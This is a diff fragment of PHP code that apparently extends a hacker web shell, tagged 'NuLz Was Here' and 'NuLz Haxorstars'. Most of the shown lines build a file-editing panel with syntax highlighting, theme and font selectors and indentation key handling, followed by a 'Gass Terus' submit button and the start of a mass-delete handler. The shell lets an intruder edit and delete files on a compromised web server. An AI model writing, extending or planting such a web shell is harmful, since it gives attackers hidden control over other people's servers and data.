+                            font-family: "Roboto Mono", monospace;
+                            font-weight: 400;
+                            font-size: 12pt;
+                            line-height: 150%;
+                            overflow-y: scroll;
+                            overflow-x: auto;
+                        }
+
+                    textarea {
+                        font-family: "Roboto Mono", monospace;
+                        font-weight: 400;
+                        font-size: 12pt;
+                        line-height: 150%;
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        height: calc(100% - 30px);
+                        width: calc(100% - 30px);
+                        padding: 15px;
+                        z-index: 2;
+                        overflow-x: auto;
+                        overflow-y: scroll;
+                        white-space: nowrap;
+                        background-color: rgba(0,0,0,0);
+                        color: rgba(0,0,0,0);
+                        caret-color: white;
+                    }
+                </style>
+                <span class="block '.$txtBlue.' font-medium">Filecontent <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                <span>Theme:</span>
+                    <select id="selectStyle" class="bg-black">
+                        <option>a11y-dark.min.css</option>
+                        <option>a11y-light.min.css</option>
+                        <option>agate.min.css</option>
+                        <option>an-old-hope.min.css</option>
+                        <option>androidstudio.min.css</option>
+                        <option>arduino-light.min.css</option>
+                        <option>arta.min.css</option>
+                        <option>ascetic.min.css</option>
+                        <option>atom-one-dark-reasonable.min.css</option>
+                        <option>atom-one-dark.min.css</option>
+                        <option>atom-one-light.min.css</option>
+                        <option>brown-paper.min.css</option>
+                        <option>codepen-embed.min.css</option>
+                        <option>color-brewer.min.css</option>
+                        <option>dark.min.css</option>
+                        <option>default.min.css</option>
+                        <option>devibeans.min.css</option>
+                        <option>docco.min.css</option>
+                        <option>far.min.css</option>
+                        <option>felipec.min.css</option>
+                        <option>foundation.min.css</option>
+                        <option>github-dark-dimmed.min.css</option>
+                        <option>github-dark.min.css</option>
+                        <option>github.min.css</option>
+                        <option>gml.min.css</option>
+                        <option>googlecode.min.css</option>
+                        <option>gradient-dark.min.css</option>
+                        <option>gradient-light.min.css</option>
+                        <option>grayscale.min.css</option>
+                        <option>hybrid.min.css</option>
+                        <option>idea.min.css</option>
+                        <option>intellij-light.min.css</option>
+                        <option>ir-black.min.css</option>
+                        <option>isbl-editor-dark.min.css</option>
+                        <option>isbl-editor-light.min.css</option>
+                        <option>kimbie-dark.min.css</option>
+                        <option>kimbie-light.min.css</option>
+                        <option>lightfair.min.css</option>
+                        <option>lioshi.min.css</option>
+                        <option>magula.min.css</option>
+                        <option>mono-blue.min.css</option>
+                        <option>monokai-sublime.min.css</option>
+                        <option>monokai.min.css</option>
+                        <option>night-owl.min.css</option>
+                        <option>nnfx-dark.min.css</option>
+                        <option>nnfx-light.min.css</option>
+                        <option>nord.min.css</option>
+                        <option>obsidian.min.css</option>
+                        <option>panda-syntax-dark.min.css</option>
+                        <option>panda-syntax-light.min.css</option>
+                        <option>paraiso-dark.min.css</option>
+                        <option>paraiso-light.min.css</option>
+                        <option>pojoaque.min.css</option>
+                        <option>purebasic.min.css</option>
+                        <option>qtcreator-dark.min.css</option>
+                        <option>qtcreator-light.min.css</option>
+                        <option>rainbow.min.css</option>
+                        <option>routeros.min.css</option>
+                        <option>school-book.min.css</option>
+                        <option>shades-of-purple.min.css</option>
+                        <option>srcery.min.css</option>
+                        <option>stackoverflow-dark.min.css</option>
+                        <option>stackoverflow-light.min.css</option>
+                        <option>sunburst.min.css</option>
+                        <option>tokyo-night-dark.min.css</option>
+                        <option>tokyo-night-light.min.css</option>
+                        <option>tomorrow-night-blue.min.css</option>
+                        <option>tomorrow-night-bright.min.css</option>
+                        <option>vs.min.css</option>
+                        <option selected>vs2015.min.css</option>
+                        <option>xcode.min.css</option>
+                        <option>xt256.min.css</option>
+                        <option>base16/3024.min.css</option>
+                        <option>base16/apathy.min.css</option>
+                        <option>base16/apprentice.min.css</option>
+                        <option>base16/ashes.min.css</option>
+                        <option>base16/atelier-cave-light.min.css</option>
+                        <option>base16/atelier-cave.min.css</option>
+                        <option>base16/atelier-dune-light.min.css</option>
+                        <option>base16/atelier-dune.min.css</option>
+                        <option>base16/atelier-estuary-light.min.css</option>
+                        <option>base16/atelier-estuary.min.css</option>
+                        <option>base16/atelier-forest-light.min.css</option>
+                        <option>base16/atelier-forest.min.css</option>
+                        <option>base16/atelier-heath-light.min.css</option>
+                        <option>base16/atelier-heath.min.css</option>
+                        <option>base16/atelier-lakeside-light.min.css</option>
+                        <option>base16/atelier-lakeside.min.css</option>
+                        <option>base16/atelier-plateau-light.min.css</option>
+                        <option>base16/atelier-plateau.min.css</option>
+                        <option>base16/atelier-savanna-light.min.css</option>
+                        <option>base16/atelier-savanna.min.css</option>
+                        <option>base16/atelier-seaside-light.min.css</option>
+                        <option>base16/atelier-seaside.min.css</option>
+                        <option>base16/atelier-sulphurpool-light.min.css</option>
+                        <option>base16/atelier-sulphurpool.min.css</option>
+                        <option>base16/atlas.min.css</option>
+                        <option>base16/bespin.min.css</option>
+                        <option>base16/black-metal-bathory.min.css</option>
+                        <option>base16/black-metal-burzum.min.css</option>
+                        <option>base16/black-metal-dark-funeral.min.css</option>
+                        <option>base16/black-metal-gorgoroth.min.css</option>
+                        <option>base16/black-metal-immortal.min.css</option>
+                        <option>base16/black-metal-khold.min.css</option>
+                        <option>base16/black-metal-marduk.min.css</option>
+                        <option>base16/black-metal-mayhem.min.css</option>
+                        <option>base16/black-metal-nile.min.css</option>
+                        <option>base16/black-metal-venom.min.css</option>
+                        <option>base16/black-metal.min.css</option>
+                        <option>base16/brewer.min.css</option>
+                        <option>base16/bright.min.css</option>
+                        <option>base16/brogrammer.min.css</option>
+                        <option>base16/brush-trees-dark.min.css</option>
+                        <option>base16/brush-trees.min.css</option>
+                        <option>base16/chalk.min.css</option>
+                        <option>base16/circus.min.css</option>
+                        <option>base16/classic-dark.min.css</option>
+                        <option>base16/classic-light.min.css</option>
+                        <option>base16/codeschool.min.css</option>
+                        <option>base16/colors.min.css</option>
+                        <option>base16/cupcake.min.css</option>
+                        <option>base16/cupertino.min.css</option>
+                        <option>base16/danqing.min.css</option>
+                        <option>base16/darcula.min.css</option>
+                        <option>base16/dark-violet.min.css</option>
+                        <option>base16/darkmoss.min.css</option>
+                        <option>base16/darktooth.min.css</option>
+                        <option>base16/decaf.min.css</option>
+                        <option>base16/default-dark.min.css</option>
+                        <option>base16/default-light.min.css</option>
+                        <option>base16/dirtysea.min.css</option>
+                        <option>base16/dracula.min.css</option>
+                        <option>base16/edge-dark.min.css</option>
+                        <option>base16/edge-light.min.css</option>
+                        <option>base16/eighties.min.css</option>
+                        <option>base16/embers.min.css</option>
+                        <option>base16/equilibrium-dark.min.css</option>
+                        <option>base16/equilibrium-gray-dark.min.css</option>
+                        <option>base16/equilibrium-gray-light.min.css</option>
+                        <option>base16/equilibrium-light.min.css</option>
+                        <option>base16/espresso.min.css</option>
+                        <option>base16/eva-dim.min.css</option>
+                        <option>base16/eva.min.css</option>
+                        <option>base16/flat.min.css</option>
+                        <option>base16/framer.min.css</option>
+                        <option>base16/fruit-soda.min.css</option>
+                        <option>base16/gigavolt.min.css</option>
+                        <option>base16/github.min.css</option>
+                        <option>base16/google-dark.min.css</option>
+                        <option>base16/google-light.min.css</option>
+                        <option>base16/grayscale-dark.min.css</option>
+                        <option>base16/grayscale-light.min.css</option>
+                        <option>base16/green-screen.min.css</option>
+                        <option>base16/gruvbox-dark-hard.min.css</option>
+                        <option>base16/gruvbox-dark-medium.min.css</option>
+                        <option>base16/gruvbox-dark-pale.min.css</option>
+                        <option>base16/gruvbox-dark-soft.min.css</option>
+                        <option>base16/gruvbox-light-hard.min.css</option>
+                        <option>base16/gruvbox-light-medium.min.css</option>
+                        <option>base16/gruvbox-light-soft.min.css</option>
+                        <option>base16/hardcore.min.css</option>
+                        <option>base16/harmonic16-dark.min.css</option>
+                        <option>base16/harmonic16-light.min.css</option>
+                        <option>base16/heetch-dark.min.css</option>
+                        <option>base16/heetch-light.min.css</option>
+                        <option>base16/helios.min.css</option>
+                        <option>base16/hopscotch.min.css</option>
+                        <option>base16/horizon-dark.min.css</option>
+                        <option>base16/horizon-light.min.css</option>
+                        <option>base16/humanoid-dark.min.css</option>
+                        <option>base16/humanoid-light.min.css</option>
+                        <option>base16/ia-dark.min.css</option>
+                        <option>base16/ia-light.min.css</option>
+                        <option>base16/icy-dark.min.css</option>
+                        <option>base16/ir-black.min.css</option>
+                        <option>base16/isotope.min.css</option>
+                        <option>base16/kimber.min.css</option>
+                        <option>base16/london-tube.min.css</option>
+                        <option>base16/macintosh.min.css</option>
+                        <option>base16/marrakesh.min.css</option>
+                        <option>base16/materia.min.css</option>
+                        <option>base16/material-darker.min.css</option>
+                        <option>base16/material-lighter.min.css</option>
+                        <option>base16/material-palenight.min.css</option>
+                        <option>base16/material-vivid.min.css</option>
+                        <option>base16/material.min.css</option>
+                        <option>base16/mellow-purple.min.css</option>
+                        <option>base16/mexico-light.min.css</option>
+                        <option>base16/mocha.min.css</option>
+                        <option>base16/monokai.min.css</option>
+                        <option>base16/nebula.min.css</option>
+                        <option>base16/nord.min.css</option>
+                        <option>base16/nova.min.css</option>
+                        <option>base16/ocean.min.css</option>
+                        <option>base16/oceanicnext.min.css</option>
+                        <option>base16/one-light.min.css</option>
+                        <option>base16/onedark.min.css</option>
+                        <option>base16/outrun-dark.min.css</option>
+                        <option>base16/papercolor-dark.min.css</option>
+                        <option>base16/papercolor-light.min.css</option>
+                        <option>base16/paraiso.min.css</option>
+                        <option>base16/pasque.min.css</option>
+                        <option>base16/phd.min.css</option>
+                        <option>base16/pico.min.css</option>
+                        <option>base16/pop.min.css</option>
+                        <option>base16/porple.min.css</option>
+                        <option>base16/qualia.min.css</option>
+                        <option>base16/railscasts.min.css</option>
+                        <option>base16/rebecca.min.css</option>
+                        <option>base16/ros-pine-dawn.min.css</option>
+                        <option>base16/ros-pine-moon.min.css</option>
+                        <option>base16/ros-pine.min.css</option>
+                        <option>base16/sagelight.min.css</option>
+                        <option>base16/sandcastle.min.css</option>
+                        <option>base16/seti-ui.min.css</option>
+                        <option>base16/shapeshifter.min.css</option>
+                        <option>base16/silk-dark.min.css</option>
+                        <option>base16/silk-light.min.css</option>
+                        <option>base16/snazzy.min.css</option>
+                        <option>base16/solar-flare-light.min.css</option>
+                        <option>base16/solar-flare.min.css</option>
+                        <option>base16/solarized-dark.min.css</option>
+                        <option>base16/solarized-light.min.css</option>
+                        <option>base16/spacemacs.min.css</option>
+                        <option>base16/summercamp.min.css</option>
+                        <option>base16/summerfruit-dark.min.css</option>
+                        <option>base16/summerfruit-light.min.css</option>
+                        <option>base16/synth-midnight-terminal-dark.min.css</option>
+                        <option>base16/synth-midnight-terminal-light.min.css</option>
+                        <option>base16/tango.min.css</option>
+                        <option>base16/tender.min.css</option>
+                        <option>base16/tomorrow-night.min.css</option>
+                        <option>base16/tomorrow.min.css</option>
+                        <option>base16/twilight.min.css</option>
+                        <option>base16/unikitty-dark.min.css</option>
+                        <option>base16/unikitty-light.min.css</option>
+                        <option>base16/vulcan.min.css</option>
+                        <option>base16/windows-10-light.min.css</option>
+                        <option>base16/windows-10.min.css</option>
+                        <option>base16/windows-95-light.min.css</option>
+                        <option>base16/windows-95.min.css</option>
+                        <option>base16/windows-high-contrast-light.min.css</option>
+                        <option>base16/windows-high-contrast.min.css</option>
+                        <option>base16/windows-nt-light.min.css</option>
+                        <option>base16/windows-nt.min.css</option>
+                        <option>base16/woodland.min.css</option>
+                        <option>base16/xcode-dusk.min.css</option>
+                        <option>base16/zenburn.min.css</option>
+                    </select><br><br>
+                    <span>Font:</span>
+                    <select id="selectFont" class="bg-black">
+                        <option>Roboto Mono</option>
+                        <option>Consolas</option>
+                        <option>Cascadia Mono</option>
+                        <option>Inconsolata</option>
+                        <option>Source Code Pro</option>
+                        <option>IBM Plex Mono</option>
+                        <option>Space Mono</option>
+                        <option>PT Mono</option>
+                        <option>Ubuntu Mono</option>
+                        <option>Nanum Gothic Coding</option>
+                        <option>Cousine</option>
+                        <option>Fira Mono</option>
+                        <option>Share Tech Mono</option>
+                        <option>Courier Prime</option>
+                        <option>Anonymous Pro</option>
+                        <option>Cutive Mono</option>
+                        <option>VT323</option>
+                        <option>JetBrains Mono</option>
+                        <option>Noto Sans Mono</option>
+                        <option>Red Hat Mono</option>
+                        <option>Martian Mono</option>
+                        <option>Major Mono Display</option>
+                        <option>Nova Mono</option>
+                        <option>Syne Mono</option>
+                        <option>Xanh Mono</option>
+                        <option>Monofett</option>
+                    </select><br><br>
+                    <span>Font Size (pt):</span>
+                    <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
+                    <span>Language:</span>
+                    <select id="selectLanguage" class="bg-black">
+                        <option value="language-html">HTML</option>
+                        <option value="language-javascript">JavaScript</option>
+                        <option value="language-python">Python</option>
+                        <option value="language-java">Java</option>
+                        <option value="language-csharp">C#</option>
+                        <option value="language-php">PHP</option>
+                        <option value="language-cpp">C++</option>
+                        <option value="language-typescript">TypeScript</option>
+                        <option value="language-ruby">Ruby</option>
+                    </select><br><br>
+                    <div id="divCodeWrapper">
+                        <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
+                        <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                    </div>
+                    <script type="text/javascript">
+                    const textarea1 = document.getElementById("textarea1");
+                    const codeBlock = document.getElementById("codeBlock");
+                    let content = textarea1.value;
+                    content = content.replace(/&/g, "&amp;");
+                    content = content.replace(/</g, "&lt;");
+                    content = content.replace(/>/g, "&gt;");
+                    codeBlock.innerHTML = content;
+                    highlightJS();
+
+                    function updateCode() {
+                        let content = textarea1.value;
+                        content = content.replace(/&/g, "&amp;");
+                        content = content.replace(/</g, "&lt;");
+                        content = content.replace(/>/g, "&gt;");
+                        codeBlock.innerHTML = content;
+                        highlightJS();
+                    }
+
+                    function highlightJS() {
+                        document.querySelectorAll("pre code").forEach((el) => {
+                            hljs.highlightElement(el);
+                        });
+                    }
+
+                    textarea1.addEventListener("input", () => {
+                        updateCode();
+                    });
+
+                    textarea1.addEventListener("scroll", () => {
+                        codeBlock.scrollTop = textarea1.scrollTop;
+                        codeBlock.scrollLeft = textarea1.scrollLeft;
+                    });
+
+                    textarea1.addEventListener("keydown", function (e) {
+                        if (e.key === "Enter") {
+                            e.preventDefault();
+                            var cursorPos = textarea1.selectionStart;
+                            var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
+                            var indent = prevLine.match(/^\s*/)[0];
+                            textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
+                            textarea1.blur();
+                            textarea1.focus();
+                            updateCode();
+                            return;
+                        }
+                        if (e.key === "Tab" && !e.shiftKey &&
+                            textarea1.selectionStart == textarea1.selectionEnd) {
+                            e.preventDefault();
+                            let cursorPosition = textarea1.selectionStart;
+                            let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
+                                textarea1.value.substring(cursorPosition);
+                            textarea1.value = newValue;
+                            textarea1.selectionStart = cursorPosition + 4;
+                            textarea1.selectionEnd = cursorPosition + 4;    
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key === "Tab" && e.shiftKey &&
+
+                            textarea1.selectionStart == textarea1.selectionEnd) {
+
+                            e.preventDefault();
+
+                            let cursorPosition = textarea1.selectionStart;
+                            let leadingSpaces = 0;
+                            for (let i = 0; i < 4; i++) {
+                                if (textarea1.value[cursorPosition - i - 1] === " ") {
+                                    leadingSpaces++;
+                                } else {
+                                    break;
+                                }
+                            }
+
+                            if (leadingSpaces > 0) {
+                                let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
+                                    textarea1.value.substring(cursorPosition);
+                                textarea1.value = newValue;
+                                textarea1.selectionStart = cursorPosition - leadingSpaces;
+                                textarea1.selectionEnd = cursorPosition - leadingSpaces;
+                            }
+
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
+                            e.preventDefault();
+                            let lines = this.value.split("\n");
+
+                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+
+                            let spacesRemovedFirstLine = 0;
+                            let spacesRemoved = 0;
+
+                            if (e.shiftKey) {
+                                for (let i = startPos; i <= endPos; i++) {
+                                    lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
+                                        if (i == startPos)
+                                            spacesRemovedFirstLine = match.length;
+                                        spacesRemoved += match.length;
+
+                                        return "";
+                                    });
+                                }
+                            } else {
+                                for (let i = startPos; i <= endPos; i++) {
+                                    lines[i] = "    " + lines[i];
+                                }
+                            }
+                            let start = this.selectionStart;
+                            let end = this.selectionEnd;
+                            this.value = lines.join("\n");
+                            this.selectionStart = e.shiftKey ?
+                                start - spacesRemovedFirstLine : start + 4;
+                            this.selectionEnd = e.shiftKey ?
+                                end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
+                            updateCode();
+                            return;
+                        }
+                        if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
+
+                            e.preventDefault();
+                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+                            let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
+                            let cursorPosInLine = cursorLine.length;
+                            let totalLinesRemove = endPos - startPos + 1;
+                            let lines = this.value.split("\n");
+                            let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
+                            lines.splice(startPos, totalLinesRemove);
+                            let newLine = lines[startPos] || "";
+                            if (newLine.length < cursorPosInLine) {
+                                cursorPosInLine = newLine.length;
+                            }
+                            newStart += cursorPosInLine;
+
+                            this.value = lines.join("\n");
+                            this.selectionStart = this.selectionEnd = newStart; 
+                            updateCode();
+                            return;
+                        }
+
+                        if (e.key === "Home") {
+                            let line = this.value.substring(0, this.selectionStart).split("\n").pop();
+                            let cursorPosInLine = line.length;
+                            let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
+                            let firstNonWhitespacePos = line.search(/\S/);
+                            if (firstNonWhitespacePos >= cursorPosInLine) {
+                                return true;
+                            }
+                            else if (firstNonWhitespacePos === -1) {
+                                return true;
+                            }
+                            e.preventDefault();
+                            this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
+                            return;
+                        }
+                    });
+
+                    document.getElementById("selectStyle").addEventListener("change", (e) => {
+                        document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
+                    });
+
+                    function updateFont() {
+                        let selectFont = document.getElementById("selectFont");
+                        let fontName = selectFont.options[selectFont.selectedIndex].text;
+                        let fontNameUrl = fontName.replace(" ", "+");
+                        let inputFontSize = document.getElementById("inputFontSize");
+                        document.getElementById("style2").textContent = `
+                        @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
+                        pre, code, textarea {
+                            font-family: "${fontName}", monospace !important;
+                            font-size: ${inputFontSize.value}pt !important;
+                        }`;
+                    }
+
+                    document.getElementById("selectLanguage").addEventListener("change", function () {
+                        document.getElementById("codeBlock").className = this.value;
+                        highlightJS();
+                    });
+
+                    document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });
+
+                    document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
+                    </script>
+                    ';
+                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+                echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Gass Terus</button>';
+                echo '</form>';
+            } else {
+                echo '<span style="display: none;">NuLz Haxorstars</span>';
+            }
+        }
     }
 
     if (isset($_GET['mass_delete'])) {
